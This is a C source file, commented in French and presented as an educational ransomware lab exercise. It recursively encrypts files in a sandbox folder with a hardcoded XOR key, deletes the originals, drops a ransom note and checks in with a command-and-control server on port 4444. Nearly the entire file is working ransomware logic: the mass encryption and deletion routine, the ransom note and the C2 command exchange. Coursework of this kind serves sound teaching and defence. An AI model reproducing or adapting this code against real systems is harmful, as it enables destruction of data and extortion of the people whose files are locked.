/* * RANSOMWARE ÉDUCATIF - VERSION FINALE
 * * Ce programme simule le comportement d'un ransomware réel :
 * 1. Parcours récursif
 * 2. Chiffrement de masse
 * 3. Demande de rançon
 * 4. Déchiffrement sous condition
 * 5. Test de communication C2
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

// Inclusion des modules existants
#include "scanner.h"
#include "xor_crypto.h"
#include "checksum.h"
#include "config.h"
#include "c2_client.h" 

// ============================================================================
// CONFIGURATION DU MALWARE
// ============================================================================
#define RANSOM_KEY "MALWARE2026"          // Clé de chiffrement (Hardcoded)
#define ENCRYPTED_EXTENSION ".locked"     // Extension des fichiers chiffrés
#define RANSOM_NOTE "RANSOM_NOTE.txt"     // Nom de la note de rançon
#define TARGET_DIR "sandbox"              // Dossier cible

// Configuration C2 (Assurez-vous que C2_SERVER_IP est dans c2_client.h ou config.h)
#ifndef C2_SERVER_IP
#define C2_SERVER_IP "127.0.0.1"
#endif

// Le serveur fourni écoute sur le port 4444
#define C2_PORT 4444 

// Couleurs pour le terminal
#define RED     "\033[1;31m"
#define GREEN   "\033[1;32m"
#define YELLOW  "\033[1;33m"
#define CYAN    "\033[1;36m"
#define RESET   "\033[0m"

// ============================================================================
// PROTOTYPES
// ============================================================================
void create_ransom_note();
void print_banner();
void encrypt_all_files();
void decrypt_all_files();
void test_c2_connection(); // Nouvelle fonction

// ============================================================================
// FONCTIONS UTILITAIRES & LOGIQUE
// ============================================================================

void print_banner() {
    printf("\n");
    printf(RED);
    printf("╔═══════════════════════════════════════════════════════╗\n");
    printf("║                                                       ║\n");
    printf("║    ⚠️  VOTRE SYSTÈME A ÉTÉ COMPROMIS ! ⚠️           ║\n");
    printf("║                                                       ║\n");
    printf("║    Tous vos fichiers ont été chiffrés !               ║\n");
    printf("║                                                       ║\n");
    printf("╚═══════════════════════════════════════════════════════╝\n");
    printf(RESET);
}

void create_ransom_note() {
    char note_path[MAX_PATH];
    snprintf(note_path, sizeof(note_path), "%s/%s", TARGET_DIR, RANSOM_NOTE);

    FILE *f = fopen(note_path, "w");
    if (!f) return;

    fprintf(f, "═══════════════════════════════════════════════════════\n");
    fprintf(f, "          ⚠️  AVERTISSEMENT DE SÉCURITÉ ⚠️\n");
    fprintf(f, "═══════════════════════════════════════════════════════\n\n");
    fprintf(f, "TOUS VOS FICHIERS ONT ÉTÉ CHIFFRÉS !\n\n");
    fprintf(f, "🔐 Algorithme : XOR avec clé secrète\n");
    fprintf(f, "📅 Date : Aujourd'hui\n\n");
    fprintf(f, "Pour déchiffrer vos fichiers :\n");
    fprintf(f, "./ransomware_complet decrypt\n\n");
    fprintf(f, "⚠️  CECI EST UN TP ÉDUCATIF ⚠️\n");
    fprintf(f, "Clé de déchiffrement : %s\n", RANSOM_KEY);

    fclose(f);
    printf(YELLOW "[+] Note de rançon générée : %s\n" RESET, note_path);
}

// ============================================================================
// COMMUNICATION C2
// ============================================================================
void test_c2_connection() {
    printf(CYAN "[*] Tentative de connexion au C2 (%s:%d)...\n" RESET, C2_SERVER_IP, C2_PORT);
    
    int sock = c2_connect(C2_SERVER_IP, C2_PORT);
    
    if (sock < 0) {
        printf(RED "✗ Échec de connexion au serveur C2.\n" RESET);
        return;
    }

    printf(GREEN "✓ Connecté au serveur C2.\n" RESET);

    C2Command cmd;
    C2Response resp;

    // ÉTAPE 1 : Vérification du STATUS
    memset(&cmd, 0, sizeof(cmd));
    strcpy(cmd.command, "STATUS");

    printf("[>] Envoi commande : STATUS\n");
    resp = c2_send_command(sock, &cmd);
    printf("[<] Réponse serveur : %s\n", resp.message);

    // ÉTAPE 2 : Si le serveur est prêt, demander instruction ENCRYPT
    if (resp.status == 1) {
        memset(&cmd, 0, sizeof(cmd));
        strcpy(cmd.command, "ENCRYPT");
        strcpy(cmd.target, "TEST_TARGET"); // Cible fictive pour le test

        printf("[>] Envoi commande : ENCRYPT\n");
        resp = c2_send_command(sock, &cmd);
        printf(YELLOW "[<] Instruction reçue : %s\n" RESET, resp.message);
    } else {
        printf(RED "⚠ Serveur non prêt ou erreur de statut.\n" RESET);
    }

    c2_disconnect(sock);
    printf(CYAN "[*] Connexion fermée.\n" RESET);
}

// ============================================================================
// CHIFFREMENT DE MASSE
// ============================================================================
void encrypt_all_files() {
    printf(CYAN "[*] Démarrage du chiffrement dans '%s'...\n" RESET, TARGET_DIR);

    char (*files)[MAX_PATH] = malloc(MAX_FILES * sizeof(*files));
    if (!files) {
        perror("Erreur allocation mémoire");
        return;
    }

    int count = scan_recursive(TARGET_DIR, files, MAX_FILES, 0);
    int success_count = 0;

    printf("[*] %d fichiers trouvés.\n", count);

    for (int i = 0; i < count; i++) {
        char *filename = files[i];

        if (strstr(filename, RANSOM_NOTE) || strstr(filename, ENCRYPTED_EXTENSION)) {
            continue;
        }

        uint32_t crc = calculate_crc32(filename);
        printf(" -> Chiffrement : %s (CRC32: %08X)\n", filename, crc);

        char output_name[MAX_PATH];
        snprintf(output_name, sizeof(output_name), "%s%s", filename, ENCRYPTED_EXTENSION);

        if (xor_encrypt_file(filename, output_name, RANSOM_KEY) == 0) {
            if (remove(filename) == 0) {
                success_count++;
            } else {
                perror("Erreur suppression original");
            }
        } else {
            printf(RED "Erreur chiffrement : %s\n" RESET, filename);
        }
    }

    free(files);
    create_ransom_note();
    print_banner();
    printf(RED "\n%d fichiers ont été verrouillés.\n" RESET, success_count);
}

// ============================================================================
// DÉCHIFFREMENT DE MASSE
// ============================================================================
void decrypt_all_files() {
    char input_key[128];

    printf(YELLOW "Entrez la clé de déchiffrement : " RESET);
    scanf("%127s", input_key);

    if (strcmp(input_key, RANSOM_KEY) != 0) {
        printf(RED "❌ Clé incorrecte ! Accès refusé.\n" RESET);
        return;
    }

    printf(GREEN "✓ Clé valide. Démarrage du déchiffrement...\n" RESET);

    char (*files)[MAX_PATH] = malloc(MAX_FILES * sizeof(*files));
    if (!files) return;

    int count = scan_recursive(TARGET_DIR, files, MAX_FILES, 0);
    int recovered_count = 0;

    for (int i = 0; i < count; i++) {
        char *filename = files[i];
        char *ext = strstr(filename, ENCRYPTED_EXTENSION);
        
        if (ext && strcmp(ext, ENCRYPTED_EXTENSION) == 0) {
            char original_name[MAX_PATH];
            size_t len = strlen(filename) - strlen(ENCRYPTED_EXTENSION);
            strncpy(original_name, filename, len);
            original_name[len] = '\0';

            if (xor_decrypt_file(filename, original_name, RANSOM_KEY) == 0) {
                remove(filename);
                printf(" -> Restauré : %s\n", original_name);
                recovered_count++;
            }
        }
    }

    free(files);
    char note_path[MAX_PATH];
    snprintf(note_path, sizeof(note_path), "%s/%s", TARGET_DIR, RANSOM_NOTE);
    remove(note_path);

    printf(GREEN "\nSUCCÈS : %d fichiers récupérés.\n" RESET, recovered_count);
}

// ============================================================================
// MAIN
// ============================================================================
int main(int argc, char *argv[]) {
    // Vérification des arguments
    if (argc < 2) {
        printf("UTILISATION:\n");
        printf("  %s encrypt  - Chiffrer tous les fichiers de '%s'\n", argv[0], TARGET_DIR);
        printf("  %s decrypt  - Déchiffrer tous les fichiers\n", argv[0]);
        printf("  %s c2_test  - Tester la connexion au serveur C2\n", argv[0]); // Nouvelle option
        return 1;
    }

    if (strcmp(argv[1], "encrypt") == 0) {
        printf(RED "⚠️  ATTENTION : Vous allez chiffrer le dossier '%s'.\n", TARGET_DIR);
        printf("Ceci rendra les fichiers illisibles sans la clé.\n" RESET);
        printf("Confirmer ? (o/N): ");
        
        char confirm;
        scanf(" %c", &confirm);
        if (confirm == 'o' || confirm == 'O') {
            encrypt_all_files();
        } else {
            printf("Opération annulée.\n");
        }
    } 
    else if (strcmp(argv[1], "decrypt") == 0) {
        decrypt_all_files();
    }
    // Ajout du cas C2
    else if (strcmp(argv[1], "c2_test") == 0) {
        test_c2_connection();
    }
    else {
        printf("Commande inconnue: %s\n", argv[1]);
        return 1;
    }

    return 0;
}